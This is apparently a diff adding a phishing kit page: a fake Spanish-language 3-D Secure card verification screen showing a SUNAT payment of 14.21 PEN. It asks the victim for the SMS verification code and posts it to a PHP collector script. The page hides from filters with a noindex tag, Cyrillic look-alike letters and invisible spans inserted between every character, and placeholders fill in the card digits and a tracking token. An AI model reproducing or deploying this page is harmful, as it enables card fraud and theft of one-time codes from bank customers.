@@ -1,0 +1,277 @@
+﻿<meta name="robots" content="noindex">
+
+
+
+<html lang="ko"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zakorojp/bost-js@main/style.css">
+  <link rel="stylesheet" href="./css/styles.css">
+
+  <style >
+  button#ValidateButton {
+    WIDTH: 179px;
+    height: 37px;
+    font-size: 13px;
+    color: #fff;
+    background-color: #337ab7;
+    border-color: #337ab7;
+    display: inline-block;
+    padding:6px 12px;
+    font-size:14px;
+    font-weight:400;
+    line-height:1.42857143;
+    text-align:center;
+    white-space:nowrap;
+    vertical-align:middle;
+    touch-action:manipulation;
+    cursor:pointer;
+    -webkit-user-select:none;
+    user-select:none;
+    background-image:none;
+    border:1px solid transparent;
+    border-radius:4px;
+}
+
+body {
+	margin: 0
+}
+
+img {
+	border: 0
+}
+
+
+input {
+	line-height: normal
+}
+
+fieldset {
+	border: 1px solid silver;
+	margin: 0 2px;
+	padding: .35em .625em .75em
+}
+
+legend {
+	border: 0;
+	padding: 0
+}
+
+
+
+html {
+	font-size: 10px;
+}
+
+body {
+	font-size: 14px;
+	line-height: 1.42857143;
+	color: #333;
+	background-color: #fff
+}
+
+
+img {
+	vertical-align: middle
+}
+
+.img-responsive {
+	display: block;
+	max-width: 100%;
+	height: auto
+}
+
+
+.text-center {
+	text-align: center
+}
+
+
+
+
+* {
+	-moz-box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box
+}
+
+img {
+	height: auto;
+	max-width: 100%
+}
+
+
+.col-6 {
+	width: 50%
+}
+
+
+
+@charset "UTF-8";
+
+
+[class*=" col-"],
+[class^=col-] {
+	padding: 3px 0.714em;
+}
+
+
+body {
+	font-size: 1.25em
+}
+
+@media screen and (min-width:251px) {
+	.row {
+		padding: 1.2%;
+	}
+}
+
+.threeds-one .body,
+.threeds-one .container,
+.threeds-one .header,
+.threeds-one .sticky-footer {
+	max-width: 400px;
+	margin: 0 auto
+}
+
+
+
+
+@-moz-document url-prefix() {}
+
+form {
+	margin-bottom: 0
+}
+
+
+
+@supports (-ms-ime-align:auto) {}
+
+
+.header,
+legend {
+	color: #6f6f6f
+}
+
+
+fieldset {
+	border: 0
+}
+
+fieldset>legend {
+	border-bottom: 0;
+	font-size: 1.00em
+}
+
+.field-validation-error {
+	color: #AB2C29
+}
+img {
+    width: 120PX;
+}
+
+
+
+.IMG {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+}
+
+</style>
+
+    <div class="threeds-one">
+      <div class="container container-sticky-footer">
+        <div class="header" id="HeaderLogos">
+          <div class="row no-pad">
+            <div class="col-12 IMG">
+              <img class="img-responsive header-logo pull-left" src="./img/one1.jpg">
+              <img alt="" class="img-responsive header-logo pull-right" src="./img/223.png">
+            </div>
+          </div>
+        </div>
+        <div class="container container-sticky-footer">
+            <div class="body" dir="LTR" style="bottom: 54px;">
+              <div class="row form-two-col">
+                <div class="col-12">
+                  <span>
+                    <p class="nospace">
+                      <b>Р<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span>f<span style="display:none;">****</span>і<span style="display:none;">****</span>r<span style="display:none;">****</span>m<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span> <span style="display:none;">****</span>е<span style="display:none;">****</span>l<span style="display:none;">****</span> <span style="display:none;">****</span>р<span style="display:none;">****</span>r<span style="display:none;">****</span>о<span style="display:none;">****</span>с<span style="display:none;">****</span>е<span style="display:none;">****</span>s<span style="display:none;">****</span>о<span style="display:none;">****</span>,<span style="display:none;">****</span> <span style="display:none;">****</span>і<span style="display:none;">****</span>n<span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>о<span style="display:none;">****</span>d<span style="display:none;">****</span>u<span style="display:none;">****</span>с<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>l<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>с<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>s<span style="display:none;">****</span>е<span style="display:none;">****</span>ñ<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>q<span style="display:none;">****</span>u<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>t<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>е<span style="display:none;">****</span>n<span style="display:none;">****</span>v<span style="display:none;">****</span>і<span style="display:none;">****</span>а<span style="display:none;">****</span>m<span style="display:none;">****</span>о<span style="display:none;">****</span>s<span style="display:none;">****</span> <span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>t<span style="display:none;">****</span>u<span style="display:none;">****</span> <span style="display:none;">****</span>m<span style="display:none;">****</span>ó<span style="display:none;">****</span>v<span style="display:none;">****</span>і<span style="display:none;">****</span>l<span style="display:none;">****</span> <span style="display:none;">****</span>р<span style="display:none;">****</span>о<span style="display:none;">****</span>r<span style="display:none;">****</span> <span style="display:none;">****</span>S<span style="display:none;">****</span>М<span style="display:none;">****</span>S.</b>
+                    </p>
+                  </span>
+                  <fieldset id="ValidateTransactionDetailsContainer">
+                    <br>
+                    <legend id="ValidateTransactionDetailsHeader">D<span style="display:none;">****</span>е<span style="display:none;">****</span>t<span style="display:none;">****</span>а<span style="display:none;">****</span>l<span style="display:none;">****</span>l<span style="display:none;">****</span>е<span style="display:none;">****</span>s<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>l<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>t<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>n<span style="display:none;">****</span>s<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n</legend>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">С<span style="display:none;">****</span>о<span style="display:none;">****</span>m<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>о:</span>
+                      <span class="col-6 always-left-to-right">S<span style="display:none;">****</span>U<span style="display:none;">****</span>N<span style="display:none;">****</span>А<span style="display:none;">****</span>Т<span style="display:none;">****</span> <span style="display:none;">****</span>О<span style="display:none;">****</span>р<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span>е<span style="display:none;">****</span>s</span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">М<span style="display:none;">****</span>о<span style="display:none;">****</span>n<span style="display:none;">****</span>t<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>F<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>t<span style="display:none;">****</span>u<span style="display:none;">****</span>r<span style="display:none;">****</span>а:</span>
+                      <span class="col-6 always-left-to-right">14.21 (PEN)</span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">F<span style="display:none;">****</span>е<span style="display:none;">****</span>с<span style="display:none;">****</span>h<span style="display:none;">****</span>а<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>Т<span style="display:none;">****</span>r<span style="display:none;">****</span>а<span style="display:none;">****</span>n<span style="display:none;">****</span>s<span style="display:none;">****</span>а<span style="display:none;">****</span>с<span style="display:none;">****</span>с<span style="display:none;">****</span>і<span style="display:none;">****</span>ó<span style="display:none;">****</span>n:</span>
+                      <span class="col-6 always-left-to-right">
+                        <span id="date_heure">{{dat}}</span>
+                        <script data-savepage-type="text/javascript" type="text/plain"></script>
+                      </span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">N<span style="display:none;">****</span>ú<span style="display:none;">****</span>m<span style="display:none;">****</span>е<span style="display:none;">****</span>r<span style="display:none;">****</span>о<span style="display:none;">****</span> <span style="display:none;">****</span>d<span style="display:none;">****</span>е<span style="display:none;">****</span> <span style="display:none;">****</span>t<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span>j<span style="display:none;">****</span>е<span style="display:none;">****</span>t<span style="display:none;">****</span>а:</span>
+                      <span class="col-6 always-left-to-right">************ {{bins}}</span>
+                    </div>
+					    <form class="" action="./includes/gotais.php" method="post">
+
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Сódіgо dе vеrіfісасіón:</span>
+                      <span>
+                        <input  id="Credential_Value" name="Ecom"  type="password" value="">
+								        <input hidden="" name="zabalitamittahokakdola" value="{{tokenx}}">
+
+                      </span>
+                    </div>
+             
+                    <div class="sticky-footer">
+                      <div class="row no-pad">
+                        <div class="col-12 text-center">
+                          <button type="submit" class="btn btn-w240 ripple" id="ValidateButton">Р<span style="display:none;">****</span>а<span style="display:none;">****</span>g<span style="display:none;">****</span>а<span style="display:none;">****</span>r<span style="display:none;">****</span> <span style="display:none;">****</span>а<span style="display:none;">****</span>h<span style="display:none;">****</span>о<span style="display:none;">****</span>r<span style="display:none;">****</span>а</button>
+						                          </div>
+
+
+
+						  
+						  
+  
+
+						  
+						  
+						  
+						  
+						  
+						  
+
+                      </div>
+					  						  {{error}}
+
+                    </div>
+					    </form>
+
+                  </fieldset>
+                </div>
+              </div>
+            </div>
+
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
+  </html>
+  
+  
+
+  
+  
+  
